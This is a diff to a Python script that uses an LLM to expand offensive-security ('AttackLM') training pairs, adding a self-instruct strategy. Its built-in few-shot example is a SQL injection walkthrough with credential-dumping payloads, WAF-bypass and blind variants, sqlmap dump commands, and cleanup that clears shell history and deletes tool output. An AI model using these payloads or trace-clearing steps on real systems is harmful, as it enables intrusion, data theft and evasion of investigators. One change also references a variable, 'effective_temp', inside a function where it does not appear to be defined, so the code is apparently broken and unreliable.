@@ -3,15 +3,18 @@
 evolve_pairs.py — Expand existing AttackLM training pairs into longer, richer examples.
 
 Transforms short Q&A pairs (avg ~111 words, ~58-word assistant responses) into
-longer, higher-quality training data using three strategies:
+longer, higher-quality training data using four strategies:
 
-  1. evol_instruct   — Rewrite assistant response with deeper reasoning, edge cases,
-                       detection artifacts, and cleanup steps. Single-turn, 3-5x longer.
-  2. multi_turn      — Decompose the original Q&A into a 3-5 turn conversation with
-                       progressive depth (identification → execution → artifacts →
-                       cleanup → evasion/detection).
-  3. cot             — Inject explicit chain-of-thought reasoning before the final
-                       answer using a ``<thinking>`` prefix block.
+  1. evol_instruct       — Rewrite assistant response with deeper reasoning, edge cases,
+                           detection artifacts, and cleanup steps. Single-turn, 3-5x longer.
+  2. multi_turn          — Decompose the original Q&A into a 3-5 turn conversation with
+                           progressive depth (identification → execution → artifacts →
+                           cleanup → evasion/detection).
+  3. cot                 — Inject explicit chain-of-thought reasoning before the final
+                           answer using a ``<thinking>`` prefix block.
+  4. cot_self_instruct   — Analyze the seed, reason step-by-step about what to improve,
+                           then generate a more complex evolved pair. Stores the analysis
+                           and reasoning as metadata alongside the evolved instruction.
 
 Reads standard AttackLM JSONL (messages array with role/content dicts plus provenance
 metadata fields). Output preserves all provenance fields and writes to
@@ -21,6 +24,7 @@ Usage:
     python scripts/evolve_pairs.py --strategy evol_instruct --source metasploit-framework --count 500
     python scripts/evolve_pairs.py --strategy multi_turn --source atomic-red-team --temperature 0.3
     python scripts/evolve_pairs.py --strategy cot --source sigma-hq --count 200
+    python scripts/evolve_pairs.py --strategy cot_self_instruct --source metasploit-framework --cot-temperature 0.7
     python scripts/evolve_pairs.py --strategy all --count 100 --dry-run
     python scripts/evolve_pairs.py --strategy evol_instruct --no-sleep
 """
@@ -197,7 +201,7 @@ def call_llm(
             payload = {
                 "model": model,
                 "messages": messages,
-                "temperature": temp,
+                "temperature": effective_temp,
                 "max_tokens": 8192,
             }
         else:
@@ -933,8 +937,271 @@ def build_cot_prompt(record: dict) -> list[dict]:
 
 
 # ---------------------------------------------------------------------------
-# Output construction
+# Strategy: CoT-Self-Instruct
 # ---------------------------------------------------------------------------
+COT_SELF_INSTRUCT_PROMPT = """\
+You are an expert security researcher. Your task is to create a new, more complex \
+security training example based on the following seed example.
+
+First, analyze the seed:
+1. What security domain does this belong to? (e.g., web exploitation, binary RE, \
+network attacks, malware analysis, cloud security, ICS/OT)
+2. What is the complexity level? (beginner, intermediate, advanced)
+3. What MITRE ATT&CK techniques are involved?
+4. What makes this a good training example?
+
+Then, reason step-by-step about how to create a more challenging version:
+5. How can you increase the technical depth?
+6. What additional context or constraints would make this harder?
+7. What follow-up questions would test deeper understanding?
+
+Finally, generate the evolved training pair with:
+- A more complex instruction that builds on the seed
+- A detailed, technically accurate response
+- Include specific tool commands, code snippets, or configuration examples where appropriate
+
+Seed instruction: {instruction}
+Seed response: {response}
+
+Output format:
+ANALYSIS:
+<your analysis>
+
+REASONING:
+<your step-by-step reasoning>
+
+EVOLVED:
+<instruction>
+<evolved instruction here>
+</instruction>
+<response>
+<evolved response here>
+</response>"""
+
+_COT_SI_INPUT_USER = "How do I perform a UNION-based SQL injection?"
+
+_COT_SI_INPUT_ASSISTANT = (
+    "**SQL Injection — UNION-based**\n\n"
+    "Use `' UNION SELECT 1,username,password FROM users--` in the vulnerable parameter to extract data.\n\n"
+    "**Cleanup:** No persistent changes to DB."
+)
+
+_COT_SI_OUTPUT_ANALYSIS = (
+    "1. Security domain: Web exploitation / SQL injection\n"
+    "2. Complexity level: beginner — single-step injection with no WAF evasion\n"
+    "3. MITRE ATT&CK: T1190 (Exploit Public-Facing Application), sub-technique SQL injection\n"
+    "4. This is a good training example because it demonstrates the core UNION-based injection concept, "
+    "but it lacks depth: no column enumeration, no WAF bypass techniques, no blind injection variants, "
+    "and no detection artifact discussion."
+)
+
+_COT_SI_OUTPUT_REASONING = (
+    "5. To increase technical depth, I should add: column count enumeration before the UNION, "
+    "multiple extraction techniques (error-based, blind time-based), and automated tool usage (sqlmap).\n"
+    "6. Additional constraints that would make this harder: WAF blocking common UNION patterns, "
+    "requiring case alternation or comment injection bypasses, and scenarios where direct output "
+    "is not visible (blind injection).\n"
+    "7. Follow-up questions that test deeper understanding: How would you enumerate column count? "
+    "How do you handle WAF blocking UNION/SELECT? What are the detection artifacts in web server logs?"
+)
+
+_COT_SI_OUTPUT_INSTRUCTION = (
+    "Demonstrate a full UNION-based SQL injection attack against a web application, including "
+    "column enumeration, data extraction, WAF bypass techniques, and automated exploitation "
+    "with sqlmap. Include detection artifacts and cleanup steps."
+)
+
+_COT_SI_OUTPUT_RESPONSE = (
+    "**Technique: Exploit Public-Facing Application — T1190 (SQL Injection — UNION-based)**\n\n"
+    "**Overview:**\n"
+    "UNION-based SQL injection exploits improper input sanitization in web application parameters "
+    "to append a UNION SELECT statement, allowing the attacker to extract data from other database "
+    "tables through the application's normal response. This is one of the most reliable injection "
+    "techniques because it returns data directly in the HTTP response.\n\n"
+    "**Prerequisites:**\n"
+    "- Web application with user-controllable input in SQL queries\n"
+    "- Application returns database content in the HTTP response\n"
+    "- Error messages or distinguishable response patterns visible\n"
+    "- sqlmap (optional, for automation)\n\n"
+    "**Step-by-Step Execution:**\n"
+    "```http\n"
+    "GET /search?q=' UNION SELECT 1,username,password FROM users-- HTTP/1.1\n"
+    "Host: target.local\n"
+    "```\n\n"
+    "**Step 1 — Confirm injectable parameter:**\n"
+    "```sql\n"
+    "-- Test with single quote to trigger error\n"
+    "q=test'\n"
+    "-- If error appears, confirm column count:\n"
+    "q=' ORDER BY 1--   -- success\n"
+    "q=' ORDER BY 2--   -- success\n"
+    "q=' ORDER BY 3--   -- success\n"
+    "q=' ORDER BY 4--   -- ERROR: column count is 3\n"
+    "```\n\n"
+    "**Step 2 — Extract data:**\n"
+    "```sql\n"
+    "q=' UNION SELECT 1,username,password FROM users--\n"
+    "```\n\n"
+    "**Step 3 — Automated with sqlmap:**\n"
+    "```bash\n"
+    "sqlmap -u 'http://target.local/search?q=test' --dbs --batch\n"
+    "sqlmap -u 'http://target.local/search?q=test' -D app_db -T users --dump\n"
+    "```\n\n"
+    "**Edge Cases & Variations:**\n"
+    "1. **WAF blocking UNION:** Use case alternation or comment injection:\n"
+    "   ```sql\n"
+    "   q=' UnIoN SeLeCt 1,username,password FrOm users--\n"
+    "   q='/*!UNION*/ /*!SELECT*/ 1,username,password FROM users--\n"
+    "   ```\n"
+    "2. **Blind UNION (no visible output):** Use time-based or error-based:\n"
+    "   ```sql\n"
+    "   q=' UNION SELECT 1,SLEEP(5),3--\n"
+    "   q=' UNION SELECT 1,IF(1=1,1,(SELECT 1 FROM information_schema.tables)),3--\n"
+    "   ```\n\n"
+    "**Detection Artifacts:**\n"
+    "- Web server logs: 200/500 responses with SQL keywords (UNION, SELECT, FROM) in query params\n"
+    "- WAF logs: UNION/SELECT keyword patterns blocked or flagged\n"
+    "- Database audit: unusual SELECT queries from the application service account\n"
+    "- SIEM: spike in HTTP 500 errors from /search endpoint within 5-minute window\n"
+    "- Sysmon EID 1: sqlmap process execution on attacker machine\n"
+    "- ModSecurity OWASP CRS: rule 942150 (UNION-based injection detected)\n\n"
+    "**Cleanup:**\n"
+    "```sql\n"
+    "-- No persistent database changes made (read-only extraction)\n"
+    "-- Clear browser history, proxy logs, and Burp/ZAP project files\n"
+    "```\n"
+    "```bash\n"
+    "rm -rf ~/.sqlmap/output/target.local/\n"
+    "history -c\n"
+    "```"
+)
+
+COT_SELF_INSTRUCT_FEW_SHOT: list[dict] = [
+    {
+        "input": {
+            "messages": [
+                {"role": "system", "content": "You are a red team specialist."},
+                {"role": "user", "content": _COT_SI_INPUT_USER},
+                {"role": "assistant", "content": _COT_SI_INPUT_ASSISTANT},
+            ],
+            "source": "example",
+        },
+        "output": {
+            "analysis": _COT_SI_OUTPUT_ANALYSIS,
+            "reasoning": _COT_SI_OUTPUT_REASONING,
+            "instruction": _COT_SI_OUTPUT_INSTRUCTION,
+            "response": _COT_SI_OUTPUT_RESPONSE,
+        },
+    },
+]
+
+
+def build_cot_self_instruct_prompt(record: dict) -> list[dict]:
+    """Build messages for the CoT-Self-Instruct evolution strategy.
+
+    Returns a list of message dicts suitable for call_llm().
+    The model first analyzes the seed, reasons about how to improve it,
+    then generates an evolved training pair.
+    """
+    messages = record.get("messages", [])
+    user_msg = ""
+    assistant_msg = ""
+    for msg in messages:
+        if msg.get("role") == "user":
+            user_msg = msg["content"]
+        elif msg.get("role") == "assistant":
+            assistant_msg = msg["content"]
+
+    if not user_msg or not assistant_msg:
+        return []
+
+    # Build few-shot
+    few_shot_text = ""
+    for i, example in enumerate(COT_SELF_INSTRUCT_FEW_SHOT, 1):
+        inp = example["input"]
+        out = example["output"]
+        few_shot_text += f"\n--- EXAMPLE {i} ---\n"
+        few_shot_text += f"Seed instruction: {inp['messages'][1]['content']}\n"
+        few_shot_text += f"Seed response: {inp['messages'][2]['content']}\n\n"
+        few_shot_text += f"ANALYSIS:\n{out['analysis']}\n\n"
+        few_shot_text += f"REASONING:\n{out['reasoning']}\n\n"
+        few_shot_text += (
+            f"EVOLVED:\n<instruction>\n{out['instruction']}\n</instruction>\n"
+        )
+        few_shot_text += f"<response>\n{out['response']}\n</response>\n"
+
+    system_content = (
+        "You are an expert security researcher creating advanced training data. "
+        "Analyze the seed, reason step-by-step, then generate a more complex version.\n\n"
+        f"{few_shot_text}"
+    )
+
+    user_content = COT_SELF_INSTRUCT_PROMPT.format(
+        instruction=user_msg,
+        response=assistant_msg,
+    )
+
+    return [
+        {"role": "system", "content": system_content},
+        {"role": "user", "content": user_content},
+    ]
+
+
+def construct_cot_self_instruct_output(
+    original: dict,
+    evolved_instruction: str,
+    evolved_response: str,
+    analysis: str,
+    reasoning: str,
+) -> dict:
+    """Construct a CoT-Self-Instruct output record preserving provenance.
+
+    Stores the analysis and reasoning as metadata alongside the evolved pair.
+    """
+    system_msg = next(
+        (m for m in original.get("messages", []) if m.get("role") == "system"),
+        {
+            "role": "system",
+            "content": "You are an authorized red team adversary emulation specialist.",
+        },
+    )
+
+    output = {
+        "messages": [
+            system_msg,
+            {"role": "user", "content": evolved_instruction},
+            {"role": "assistant", "content": evolved_response},
+        ],
+        "source": original.get("source", "unknown"),
+        "strategy": "cot_self_instruct",
+    }
+
+    # Preserve provenance fields
+    for key in (
+        "source_uri",
+        "license",
+        "license_uri",
+        "rights_contact",
+        "upstream_copyright",
+        "upstream_license_uri",
+        "attribution_required",
+        "bsd_3_clause_notice",
+        "derived_from",
+        "mitre_ids",
+        "platforms",
+        "upstream_module_path",
+    ):
+        if key in original:
+            output[key] = original[key]
+
+    output["evolved_from"] = "original"
+    output["evolved_timestamp"] = datetime.now(timezone.utc).isoformat()
+    output["cot_analysis"] = analysis
+    output["cot_reasoning"] = reasoning
+
+    return output
+
+
 def construct_evol_instruct_output(original: dict, evolved_content: str) -> dict:
     """Construct an evol_instruct output record preserving provenance."""
     # Use the original system message
@@ -1198,10 +1465,96 @@ def parse_cot_response(raw: str, original: dict) -> dict | None:
     return construct_cot_output(original, content)
 
 
+def parse_cot_self_instruct_response(raw: str, original: dict) -> dict | None:
+    """Parse the LLM response for CoT-Self-Instruct strategy.
+
+    Expects a response with ANALYSIS, REASONING, and EVOLVED sections.
+    The EVOLVED section contains <instruction>...</instruction> and
+    <response>...</response> tags.
+
+    Returns a constructed output dict with cot_analysis and cot_reasoning
+    metadata, or None if parsing fails.
+    """
+    content = raw.strip()
+
+    # Remove any markdown code fences wrapping the entire response
+    if content.startswith("```"):
+        content = re.sub(r"^```(?:\w+)?\n?", "", content)
+        content = re.sub(r"\n?```\s*$", "", content)
+        content = content.strip()
+
+    # Extract ANALYSIS section
+    analysis = ""
+    analysis_match = re.search(
+        r"ANALYSIS:\s*\n(.*?)(?=\nREASONING:)", content, re.DOTALL
+    )
+    if analysis_match:
+        analysis = analysis_match.group(1).strip()
+
+    # Extract REASONING section
+    reasoning = ""
+    reasoning_match = re.search(
+        r"REASONING:\s*\n(.*?)(?=\nEVOLVED:)", content, re.DOTALL
+    )
+    if reasoning_match:
+        reasoning = reasoning_match.group(1).strip()
+
+    # Extract EVOLVED section
+    evolved_section = ""
+    evolved_match = re.search(r"EVOLVED:\s*\n(.*)", content, re.DOTALL)
+    if evolved_match:
+        evolved_section = evolved_match.group(1).strip()
+
+    # Extract <instruction>...</instruction> from evolved section
+    evolved_instruction = ""
+    instr_match = re.search(
+        r"<instruction>\s*(.*?)\s*</instruction>",
+        evolved_section or content,
+        re.DOTALL,
+    )
+    if instr_match:
+        evolved_instruction = instr_match.group(1).strip()
+
+    # Extract <response>...</response> from evolved section
+    evolved_response = ""
+    resp_match = re.search(
+        r"<response>\s*(.*?)\s*</response>",
+        evolved_section or content,
+        re.DOTALL,
+    )
+    if resp_match:
+        evolved_response = resp_match.group(1).strip()
+
+    # Fallback: if XML tags not found, try splitting on section headers
+    if not evolved_instruction and not evolved_response:
+        # Try to find the instruction and response without XML tags
+        # Use the full evolved section as response, original question as instruction
+        if evolved_section:
+            evolved_response = evolved_section.strip()
+            # Use original user message as fallback instruction
+            original_msgs = original.get("messages", [])
+            for msg in original_msgs:
+                if msg.get("role") == "user":
+                    evolved_instruction = msg["content"]
+                    break
+
+    # Validate minimum content lengths
+    if len(evolved_instruction) < 20 or len(evolved_response) < 100:
+        return None
+
+    return construct_cot_self_instruct_output(
+        original=original,
+        evolved_instruction=evolved_instruction,
+        evolved_response=evolved_response,
+        analysis=analysis,
+        reasoning=reasoning,
+    )
+
+
 # ---------------------------------------------------------------------------
 # Core processing
 # ---------------------------------------------------------------------------
-STRATEGY_NAMES = {"evol_instruct", "multi_turn", "cot", "all"}
+STRATEGY_NAMES = {"evol_instruct", "multi_turn", "cot", "cot_self_instruct", "all"}
 
 
 def evolve_batch(
@@ -1219,6 +1572,7 @@ def evolve_batch(
         "evol_instruct": parse_evol_instruct_response,
         "multi_turn": parse_multi_turn_response,
         "cot": parse_cot_response,
+        "cot_self_instruct": parse_cot_self_instruct_response,
     }[strategy]
 
     for record in records:
@@ -1229,6 +1583,8 @@ def evolve_batch(
             prompt_messages = build_multi_turn_prompt(record)
         elif strategy == "cot":
             prompt_messages = build_cot_prompt(record)
+        elif strategy == "cot_self_instruct":
+            prompt_messages = build_cot_self_instruct_prompt(record)
         else:
             continue
 
@@ -1279,6 +1635,7 @@ def process_strategy(
     dry_run: bool,
     temperature: float | None,
     no_sleep: bool,
+    cot_temperature: float | None = None,
 ) -> None:
     """Run a single strategy across source data."""
     # Discover and load input files
@@ -1326,6 +1683,10 @@ def process_strategy(
     total_completion_tokens = 0
     total_latency_ms = 0.0
     temp = temperature if temperature is not None else DEFAULT_TEMPERATURE
+    # For cot_self_instruct, prefer cot_temperature if provided
+    effective_temp = temp
+    if strategy == "cot_self_instruct" and cot_temperature is not None:
+        effective_temp = cot_temperature
     backend = get_backend_info()
 
     # Calculate batches
@@ -1334,7 +1695,7 @@ def process_strategy(
 
     print(
         f"\n[ {strategy} ]  {len(records)} records  |  "
-        f"backend={BACKEND}  model={backend['model']}  temp={temp}"
+        f"backend={BACKEND}  model={backend['model']}  temp={effective_temp}"
     )
 
     # Plain fallback: minimal live status line
@@ -1380,7 +1741,9 @@ def process_strategy(
             end_idx = min(start_idx + batch_size, len(records))
             batch_records = records[start_idx:end_idx]
 
-            batch_results = evolve_batch(batch_records, strategy, temperature=temp)
+            batch_results = evolve_batch(
+                batch_records, strategy, temperature=effective_temp
+            )
             all_results.extend(batch_results)
 
             # Update progress
@@ -1516,8 +1879,9 @@ def main() -> None:
             "Evolution strategy to apply: "
             "'evol_instruct' (rewrite with depth), "
             "'multi_turn' (decompose into conversation), "
-            "'cot' (inject chain-of-thought), or "
-            "'all' (run all three strategies)."
+            "'cot' (inject chain-of-thought), "
+            "'cot_self_instruct' (analyze-reason-generate with CoT), or "
+            "'all' (run all four strategies)."
         ),
     )
     parser.add_argument(
@@ -1545,6 +1909,16 @@ def main() -> None:
         ),
     )
     parser.add_argument(
+        "--cot-temperature",
+        type=float,
+        default=0.7,
+        help=(
+            "Temperature for CoT-Self-Instruct strategy only (default: 0.7). "
+            "Higher than default to encourage more creative reasoning. "
+            "Overrides --temperature when using cot_self_instruct strategy."
+        ),
+    )
+    parser.add_argument(
         "--dry-run",
         action="store_true",
         default=False,
@@ -1564,6 +1938,10 @@ def main() -> None:
         parser.error(
             f"--temperature must be between 0.1 and 1.0, got {args.temperature}"
         )
+    if not 0.1 <= args.cot_temperature <= 1.0:
+        parser.error(
+            f"--cot-temperature must be between 0.1 and 1.0, got {args.cot_temperature}"
+        )
 
     backend = get_backend_info()
 
@@ -1575,13 +1953,15 @@ def main() -> None:
     print(f"Source:        {args.source or 'all'}")
     print(f"Count:        {args.count or 'all'}")
     print(f"Temperature:  {args.temperature}")
+    if args.strategy in ("cot_self_instruct", "all"):
+        print(f"CoT Temperature: {args.cot_temperature}")
     print(f"Output dir:   {OUTPUT_DIR}")
     if args.no_sleep:
         print("No-sleep:     enabled (no inter-batch pauses)")
     print()
 
     strategies = (
-        ["evol_instruct", "multi_turn", "cot"]
+        ["evol_instruct", "multi_turn", "cot", "cot_self_instruct"]
         if args.strategy == "all"
         else [args.strategy]
     )
@@ -1594,6 +1974,7 @@ def main() -> None:
             dry_run=args.dry_run,
             temperature=args.temperature,
             no_sleep=args.no_sleep,
+            cot_temperature=args.cot_temperature,
         )
 
     if not args.dry_run:
